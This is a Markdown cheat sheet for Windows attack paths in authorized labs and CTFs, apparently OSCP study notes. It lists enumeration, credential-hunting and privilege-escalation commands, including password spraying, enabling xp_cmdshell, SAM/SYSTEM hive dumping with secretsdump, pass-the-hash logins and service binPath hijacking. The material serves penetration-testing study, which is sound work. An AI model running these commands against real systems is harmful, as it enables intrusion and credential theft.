# Windows Attack Path Cheat Sheet

Generic Windows attack-path checklist for authorized labs and CTF environments.

Important note from the analyzed writeup set: most machines were Linux/Unix. Windows terms usually appeared as attacker-side PowerShell host discovery, Samba reporting `Windows 6.1`, LSASS dump artifacts inside Linux challenges, or Wine used for Linux privilege escalation.

For domain/Kerberos-specific material, use [Active Directory Attack Path Cheat Sheet](../tools/Active%20Directory%20Attack%20Path%20Cheat%20Sheet.md). For expanded local commands, use [Windows Privilege Escalation Cheat Sheet](../tools/Windows%20Privilege%20Escalation%20Cheat%20Sheet.md).

OSCP module source map: [OSCP Module Map](../references/OSCP%20Module%20Map.md#windows-module).

Course references integrated into this page:

- Hexdump Windows Privilege Escalation full course: https://www.youtube.com/watch?v=OmW7351U8cI
- LeonardoE95 Windows privilege escalation material: https://github.com/LeonardoE95/yt-en
- LeonardoE95 OSCP Windows module and cheatsheet: https://github.com/LeonardoE95/OSCP

Related alternatives:

- [Service Enumeration Alternatives](../tools/Service%20Enumeration%20Alternatives.md)
- [Web Attack Alternatives](../tools/Web%20Attack%20Alternatives.md)
- [Windows Privilege Escalation Cheat Sheet](../tools/Windows%20Privilege%20Escalation%20Cheat%20Sheet.md)

Use this page for native Windows targets when they appear, and for the Windows-adjacent cases found in the writeups.

## When To Classify As Windows

Likely native Windows:

- Nmap shows `Microsoft Windows`, `IIS`, `MSRPC`, `WinRM`, `RDP`, `SMB Windows`
- ports: `135`, `139`, `445`, `3389`, `5985`, `5986`, `88`, `389`, `636`
- shell commands use `whoami /priv`, `ipconfig`, `net user`, `PowerShell`, `cmd.exe`
- paths like `C:\Users\...`

Windows-adjacent only:

- Samba says `OS: Windows 6.1 (Samba ... Debian)`
- Linux box contains LSASS dump
- Linux privilege escalation uses Wine to run `cmd.exe`
- attacker machine uses PowerShell for scanning

## Native Windows Recon

```bash
nmap -p- --min-rate 5000 -oN ports.txt ip
nmap -sC -sV -O -p PORTS -oN nmap.txt ip
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p445 ip
```

Common services:

- SMB: `139`, `445`
- WinRM: `5985`, `5986`
- RDP: `3389`
- IIS/HTTP: `80`, `443`, `8080`
- MSSQL: `1433`
- Kerberos/LDAP: `88`, `389`, `636`

## SMB Enumeration

```bash
smbclient -L //ip/ -N
smbclient -L //ip/ -U user
enum4linux-ng -A ip
crackmapexec smb ip -u '' -p '' --shares
crackmapexec smb ip -u users.txt -p passwords.txt --continue-on-success
```

Connect:

```bash
smbclient //ip/share -N
smbclient //ip/share -U 'DOMAIN\\user'
```

Look for:

- backups
- scripts
- config files
- KeePass databases
- web roots
- unattend files
- password spreadsheets
- user lists

## WinRM

Test credentials:

```bash
crackmapexec winrm ip -u user -p pass
```

Shell:

```bash
evil-winrm -i ip -u user -p pass
evil-winrm -i ip -u user -H NTLM_HASH
```

## RDP

```bash
crackmapexec rdp ip -u user -p pass
xfreerdp /v:ip /u:user /p:pass /cert:ignore
```

## IIS / Web

```bash
whatweb http://ip/
feroxbuster -u http://ip/ -x aspx,asp,txt,config,bak,zip
ffuf -u http://ip/FUZZ -w wordlist -e .aspx,.asp,.txt,.config,.bak
```

Check:

- `web.config`
- upload forms
- ASPX shells
- backup zips
- source disclosure
- directory browsing

ASPX web shell path:

1. Upload `.aspx` if allowed.
2. Trigger command execution.
3. Upgrade to reverse shell or WinRM creds.

## MSSQL

```bash
crackmapexec mssql ip -u user -p pass
impacket-mssqlclient user:pass@ip -windows-auth
```

Useful queries:

```sql
select @@version;
select name from master..sysdatabases;
select name from sys.server_principals;
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

## Windows Local Enumeration

```cmd
whoami
whoami /priv
whoami /groups
hostname
ipconfig /all
net user
net accounts
net localgroup administrators
net localgroup "Remote Management Users"
systeminfo
route print
netstat -ano
cmdkey /list
```

PowerShell:

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
dir env:
Get-Process
Get-ChildItem -Force C:\Users
Get-ChildItem -Recurse -Force C:\Users -ErrorAction SilentlyContinue | Select-String -Pattern "password|passwd|pwd|secret|token"
Get-Service * | Select-Object DisplayName,Status,ServiceName,Can*
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like "Running"}
Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True
```

Installed application hints:

```cmd
wmic product get name,version
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
```

## Credential Hunting

Common files:

- `C:\Users\*\Desktop\*`
- `C:\Users\*\Documents\*`
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\System32\config\SAM`
- `C:\Windows\System32\config\SYSTEM`
- `web.config`
- PowerShell history:

```powershell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Fast file hunting:

```powershell
Get-ChildItem -Path C:\Users\ -Include *.kdbx,*.txt,*.config,*.xml,*.ini,*.bak,*.zip -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include web.config,unattend.xml,sysprep.inf,ConsoleHost_history.txt -File -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\Users\*\* -Pattern "password","passwd","pwd","secret","token" -ErrorAction SilentlyContinue
```

If a KeePass database appears, extract and crack it offline:

```bash
keepass2john Database.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

## Common Windows Privilege Escalation Checks

Services:

```cmd
sc query
wmic service get name,displayname,pathname,startmode
```

Service alternatives seen in Sec-Fortress winprivesc notes:

- insecure service permissions
- unquoted service path
- weak service registry permissions
- writable service executable
- autoruns/startup apps
- scheduled tasks running as SYSTEM
- insecure GUI apps launched elevated
- token impersonation

Course-style order of operations:

1. Confirm context with `whoami /priv`, `whoami /groups`, `systeminfo`, users, network routes, and listening ports.
2. Hunt credentials in user files, PowerShell history, app configs, KeePass databases, Windows Vault, and saved `cmdkey` entries.
3. Review services for weak permissions, writable binaries, unquoted paths, and unsafe DLL loads.
4. Check policy/registry paths such as `AlwaysInstallElevated`, autoruns, Winlogon, and service registry entries.
5. Review scheduled tasks and scripts that run as privileged users.
6. If privileges allow it, extract SAM/SYSTEM/SECURITY hives or parse LSASS artifacts offline in scope.
7. Use automated tools such as winPEAS or PrivescCheck to confirm, then reproduce the path manually.

Unquoted service paths:

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
```

Writable service binary/path:

```powershell
Get-Acl "C:\Path\To\Service.exe"
```

If service configuration is writable in a lab:

```cmd
sc qc ServiceName
sc config ServiceName binPath= "C:\Windows\Temp\payload.exe"
sc stop ServiceName
sc start ServiceName
```

DLL hijacking:

- use when a privileged process loads a DLL from a writable directory or has a missing DLL search path
- confirm with ProcMon, logs, or repeatable service behavior
- compile the DLL for the target architecture

```cmd
icacls "C:\Program Files\App"
```

Scheduled tasks:

```cmd
schtasks /query /fo LIST /v
dir C:\Windows\Tasks
dir C:\Windows\System32\Tasks
icacls "C:\Path\TaskScript.bat"
```

Critical registry checks:

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query HKLM\SYSTEM\CurrentControlSet\Services\ServiceName
```

Privileges:

- `SeImpersonatePrivilege` -> Potato-style attacks in labs
- `SeBackupPrivilege` -> read SAM/SYSTEM
- `SeRestorePrivilege` -> overwrite privileged files
- `AlwaysInstallElevated` -> MSI privilege escalation
- cached creds in `cmdkey /list` -> `runas /savecred`

AlwaysInstallElevated:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Cached credentials:

```powershell
cmdkey /list
runas /user:DOMAIN\Administrator /savecred "powershell -ExecutionPolicy Bypass -File C:\Path\script.ps1"
```

PowerShell credential XML:

```powershell
$cred = Import-CliXml -Path C:\path\cred.xml
$cred.GetNetworkCredential() | Format-List *
```

SAM/SYSTEM offline extraction:

```cmd
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
```

Then parse offline with Impacket in an authorized lab:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Pass-the-hash follow-up when hashes are valid for a scoped Windows service:

```bash
evil-winrm -i ip -u user -H NTHASH
impacket-wmiexec DOMAIN/user@ip -hashes :NTHASH
```

UAC bypass is not a first foothold. Use it only when the current user is already in a local administrator group but the process is medium integrity.

Cross-compile Windows payloads from Linux when the target lacks a compiler:

```bash
x86_64-w64-mingw32-gcc payload.c -o payload.exe
x86_64-w64-mingw32-gcc -shared -o hijack.dll hijack.c
```

AMSI friction usually appears when PowerShell payloads are blocked. Prefer simple signed scripts, local compiled tools, or transparent commands first; treat bypass material as a separate controlled lab topic.

## Hexdump Windows Privilege Escalation Course Map

Use this map to choose what to study after a machine shows a matching signal:

- Windows shells: when you need `cmd.exe`, PowerShell, file transfer, and reverse-shell basics.
- Windows permissions: when ACLs, local groups, or object permissions control the route.
- Reverse shells: when web upload, service abuse, or command execution needs an interactive callback.
- `SeImpersonatePrivilege`: when `whoami /priv` shows impersonation rights in a service context.
- Cross compilation: when you need a custom EXE or DLL and the target has no compiler.
- Windows services: when a privileged service can be queried, restarted, or reconfigured.
- Weak service permissions: when `sc qc`, AccessChk, or ACLs show service control rights.
- Unquoted service path: when an auto-start service path has spaces, no quotes, and writable parent components.
- DLL hijacking: when a privileged process loads from a writable or missing DLL path.
- UAC bypass: when the user is already local admin but the process is not elevated.
- AlwaysInstallElevated: when both HKCU and HKLM installer policy values are enabled.
- Files with sensitive data: when user directories, configs, backups, or KeePass files are readable.
- Windows hashes: when SAM/SYSTEM/SECURITY hives or LSASS artifacts are available in scope.
- Stored credentials and Windows Vault: when `cmdkey /list`, browser data, or credential XML files appear.
- Scheduled tasks: when a privileged task references a writable script, binary, or directory.
- Critical registry paths: when autoruns, Winlogon, service config, or startup keys are writable.
- Useful tools: when winPEAS, PrivescCheck, Seatbelt, or Sysinternals can confirm a manual hypothesis.
- AMSI bypass: when a controlled PowerShell lab intentionally focuses on script-blocking behavior.
- Cheatsheet and methodology: when building a repeatable checklist for OSCP-style boxes.

## LSASS Dump Artifact Scenario

This appeared as a Linux challenge artifact: a password-protected archive contained an LSASS memory dump from a Windows system, which exposed credentials after cracking/extraction.

Workflow:

1. Extract archive.
2. Identify dump type with `file`.
3. Use appropriate offline parser in a lab.
4. Recover cleartext/password hashes.
5. Test recovered credentials against Linux or Windows services depending on the box.

## Wine-Based Linux Escalation Scenario

One writeup used Wine inside Linux: a user could run Wine with elevated permissions, then invoke Windows `cmd.exe` through Wine to execute as root-equivalent in the Linux context.

Checks:

```bash
sudo -l
find / -iname wine 2>/dev/null
```

If sudo permits Wine:

```bash
sudo wine cmd.exe
```

Then test command execution and escape to useful Linux commands if the Wine context maps host paths.

## Samba Fingerprint Caveat

Nmap may show:

```text
OS: Windows 6.1 (Samba 4.x-Debian)
```

Treat this as a Linux Samba server unless other evidence proves native Windows. Continue with SMB enumeration, but use Linux privesc after shell access.
